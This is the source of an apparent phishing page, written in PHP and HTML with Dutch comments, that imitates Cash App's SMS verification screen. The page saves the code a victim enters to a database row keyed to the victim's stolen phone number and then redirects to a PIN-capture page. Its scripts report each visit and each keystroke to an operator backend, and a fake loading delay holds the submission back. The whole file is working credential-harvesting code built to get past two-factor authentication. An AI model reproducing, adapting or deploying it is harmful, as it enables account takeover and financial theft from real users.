<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $conn = new mysqli('localhost', 'root', '', 'my_base');
    if ($conn->connect_error) {
        die("Connectie mislukt: " . $conn->connect_error);
    }

    $code = $_POST['code'] ?? '';
    $phone = $_SESSION['phone'] ?? '';

    if (!empty($code) && !empty($phone)) {
        // Update de meest recente rij met dit telefoonnummer
        $stmt = $conn->prepare("UPDATE cshpp_data SET verification_code = ? WHERE phone_number = ? ORDER BY id DESC LIMIT 1");
        $stmt->bind_param("ss", $code, $phone);
        $stmt->execute();
        $stmt->close();
        $conn->close();

        header("Location: cashpin.php");
        exit();
    } else {
        echo "Code of telefoonnummer ontbreekt.";
    }
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Cash App - Verify</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background-color: black;
      color: white;
      font-family: sans-serif;
      height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .logo-top {
      position: absolute;
      top: 20px;
      left: 20px;
      font-size: 28px;
      font-weight: bold;
      color: white;
    }

    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 20px;
      text-align: center;
    }

    .main-logo {
      width: 140px; /* vergroot logo */
      margin-bottom: 17px;
    }

    h2 {
      margin: 10px 0;
      font-size: 20px;
    }

    .help {
      color: #00d632;
      font-size: 14px;
      margin-bottom: 20px;
    }

    form {
      width: 100%;
      max-width: 350px;
    }

    input {
      width: 100%;
      padding: 15px;
      font-size: 18px;
      border-radius: 8px;
      border: none;
      margin-bottom: 20px;
      text-align: center;
    }

    button {
      width: 100%;
      padding: 15px;
      font-size: 18px;
      border-radius: 25px;
      background-color: #00d632;
      color: white;
      border: none;
      cursor: pointer;
      margin-bottom: 20px;
    }

    .resend {
      color: #00d632;
      font-size: 14px;
    }

    .footer {
      text-align: center;
      padding: 10px 0;
      font-size: 12px;
      color: #6e6e6e;
    }

    .footer a {
      color: #337aff;
      text-decoration: none;
      margin: 0 5px;
    }
  </style>
</head>
<body>

  <div class="logo-top">$</div>

  <div class="container">
    <img src="imeg.png" alt="Cash App Logo" class="main-logo">

    <h2>Enter the code sent to your phone</h2>
    <div class="help">Get help</div>

    <form method="POST" action="cashverify.php">
      <input type="text" name="code" placeholder="123 456" required maxlength="6">
      <button type="submit">Continue</button>
    </form>

    <div class="resend">Resend Code</div>
  </div>

  <div class="footer">
    <a href="#">Terms</a>
    <a href="#">Privacy</a>
    <a href="#">Licenses</a>
  </div>

  <script>
    fetch('/admin/track_visit.php?page=formulier_data');

    function setTyping(platform) {
      fetch('set_typing.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'platform=' + platform
      });
    }

    document.querySelectorAll('input').forEach(input => {
      input.addEventListener('input', () => setTyping('cashapp'));
    });
  </script>

<!-- Laad-gif popup -->
<div id="loading" style="display: none; position: fixed; top: 50%; left: 50%; 
     transform: translate(-50%, -50%); z-index: 1000;">
  <img src="load.gif" alt="Loading..." width="60">
</div>

<script>
  const form = document.querySelector('form');
  const loading = document.getElementById('loading');

  form.addEventListener('submit', function(e) {
    e.preventDefault(); // stop direct verzenden
    loading.style.display = 'block';

    setTimeout(() => {
      form.submit(); // verzend na 6 seconden
    }, 10000);
  });
</script>


</body>
</html>
